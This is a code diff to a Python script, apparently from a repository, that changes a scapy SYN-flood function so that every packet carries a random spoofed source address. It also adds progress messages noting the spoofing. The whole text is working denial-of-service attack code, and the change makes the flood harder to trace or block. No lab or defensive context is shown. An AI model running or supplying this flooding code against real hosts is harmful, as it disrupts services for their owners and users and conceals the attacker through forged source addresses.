@@ -15,7 +15,7 @@ _REPO_ROOT = Path(__file__).resolve().parents[1]
 if str(_REPO_ROOT) not in sys.path:
     sys.path.insert(0, str(_REPO_ROOT))
 
-from scapy.all import IP, TCP, send  
+from scapy.all import IP, RandIP, TCP, send 
 
 
 def run_syn_flood(host: str, port: int, count: int, iface: str | None) -> None:
@@ -24,16 +24,21 @@ def run_syn_flood(host: str, port: int, count: int, iface: str | None) -> None:
         kwargs["iface"] = iface
 
     sent = 0
-    batch = 500
+    report_every = max(500, count // 20)
     while sent < count:
-        remaining = count - sent
-        n = min(batch, remaining)
-        pkt = IP(dst=host) / TCP(dport=port, flags="S", seq=random.randint(0, 2**32 - 1))
-        send(pkt * n, **kwargs)
-        sent += n
-        print(f"sent {sent}/{count} SYN packets...", flush=True)
+        pkt = (
+            IP(src=RandIP(), dst=host)
+            / TCP(dport=port, flags="S", seq=random.randint(0, 2**32 - 1))
+        )
+        send(pkt, **kwargs)
+        sent += 1
+        if sent % report_every == 0 or sent == count:
+            print(f"sent {sent}/{count} SYN packets (spoofed src)...", flush=True)
 
-    print(f"SYN flood complete: sent {sent} SYN packets to {host}:{port}")
+    print(
+        f"SYN flood complete: sent {sent} SYN packets toward {host}:{port} "
+        "(random source IPs via RandIP)"
+    )
 
 
 def main() -> None:
